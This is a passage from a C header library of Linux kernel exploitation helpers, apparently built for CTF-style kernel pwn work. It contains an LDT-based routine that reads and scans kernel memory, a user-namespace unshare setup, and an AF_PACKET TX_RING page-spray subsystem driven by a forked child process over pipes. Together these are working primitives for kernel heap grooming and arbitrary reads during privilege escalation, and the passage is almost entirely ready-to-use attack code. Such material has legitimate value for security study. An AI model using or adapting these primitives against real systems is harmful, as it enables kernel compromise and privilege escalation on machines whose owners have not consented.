 * Note that we should call ldtGuessingDirectMappingArea() firstly,
 * and the function should be used in that caller process
 *
 * @param ldt_momdifier function to modify the ldt_struct->entries
 * @param momdifier_args args of ldt_momdifier
 * @param page_offset_base the page_offset_base we leakked before
 * @param mem_finder your own function to search on a 0x8000-bytes buf.
 *          It should be like `size_t func(void *args, char *buf)` and the `buf`
 *          is where we store the data from kernel in ldt_seeking_memory().
 *          The return val should be the offset of the `buf`, `-1` for failure
 * @param finder_args your own function's args
 * @return size_t kernel addr of content to find, -1 for failure
 */
size_t ldt_seeking_memory(void *(*ldt_momdifier)(void *, size_t),
                          void *momdifier_args, uint64_t page_offset_base,
                          size_t (*mem_finder)(void *, char *), void *finder_args)
{
    static char buf[0x8000];
    size_t search_addr, result_addr = -1, offset;

    search_addr = page_offset_base;

    while (1)
    {
        ldt_arbitrary_read(ldt_momdifier, momdifier_args, search_addr, buf);

        offset = mem_finder(finder_args, buf);
        if (offset != -1)
        {
            result_addr = search_addr + offset;
            break;
        }

        search_addr += 0x8000;
    }

    return result_addr;
}

/**
 * 0x05. pgv与页级内存分配相关
 * 本部分仍然就是摘录于arttnba3师傅的博客
 */

#define PGV_PAGE_NUM 1000
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

struct tpacket_req
{
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
struct page_request {
    int idx;
    int cmd;
};


/* operations type */
enum
{
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};

/* tpacket version for setsockopt */
enum tpacket_versions
{
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

/* pipe for cmd communication */
int cmd_pipe_req[2], cmd_pipe_reply[2];

void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}


/* create a socket and alloc pages, return the socket fd */
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        printf("[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, 
                     &version, sizeof(version));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_VERSION)\n");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_TX_RING)\n");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}

/* the parent process should call it to send command of allocation to child */
int alloc_page(int idx)
{
    struct page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}


/* the parent process should call it to send command of freeing to child */
int free_page(int idx)
{
    struct page_request req = {
        .idx = idx,
        .cmd = CMD_FREE_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* the child, handler for commands from the pipe */
void spray_cmd_handler(void)
{
    struct page_request req;
    int socket_fd[PGV_PAGE_NUM];
    int ret;

    /* create an isolate namespace*/
    unshare_setup();

    /* handler request */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            ret = create_socket_and_alloc_pages(0x1000, 1);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            ret = close(socket_fd[req.idx]);
        } else {
            printf("[x] invalid request: %d\n", req.cmd);
        }

        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);
}

/* init pgv-exploit subsystem :) */
void prepare_pgv_system(void)
{
    /* pipe for pgv */
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);

    /* child process for pages spray */
    if (!fork())
    {
        spray_cmd_handler();
    }
}

#endif // LTFALLKERNEL_H
```

